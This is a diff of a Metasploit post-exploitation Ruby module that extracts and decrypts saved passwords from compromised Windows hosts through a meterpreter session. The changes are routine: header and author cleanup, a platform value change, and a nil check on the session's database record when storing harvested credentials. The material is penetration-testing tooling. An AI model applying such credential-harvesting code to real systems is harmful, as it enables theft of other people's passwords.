@@ -1,18 +1,15 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 require 'msf/core'
 require 'rex'
 require 'msf/core/post/windows/registry'
 require 'msf/core/post/windows/user_profiles'
+require 'msf/core/auxiliary/report'
 
 class Metasploit3 < Msf::Post
 	include Msf::Post::Windows::Registry
@@ -28,9 +25,8 @@ class Metasploit3 < Msf::Post
 			This module extracts and decrypts these passwords.
 			},
 			'License'       => MSF_LICENSE,
-			'Author'        => ['TheLightCosine <thelightcosine[at]gmail.com>'],
-			'Version'       => '$Revision$',
-			'Platform'      => [ 'windows' ],
+			'Author'        => ['theLightCosine'],
+			'Platform'      => [ 'win' ],
 			'SessionTypes'  => [ 'meterpreter' ]
 		))
 	end
@@ -57,6 +53,11 @@ class Metasploit3 < Msf::Post
 					pass = decrypt(epass)
 					pass = pass.gsub(/\x00/, '') if pass != nil and pass != ''
 					print_good("Host: #{host} Port: #{port} User: #{user}  Password: #{pass}")
+					if session.db_record
+						source_id = session.db_record.id
+					else
+						source_id = nil
+					end
 					auth =
 						{
 							:host => host,
@@ -65,7 +66,7 @@ class Metasploit3 < Msf::Post
 							:user => user,
 							:pass => pass,
 							:type => 'password',
-							:source_id => session.db_record.id,
+							:source_id => source_id,
 							:source_type => "exploit",
 							:active => true
 						}
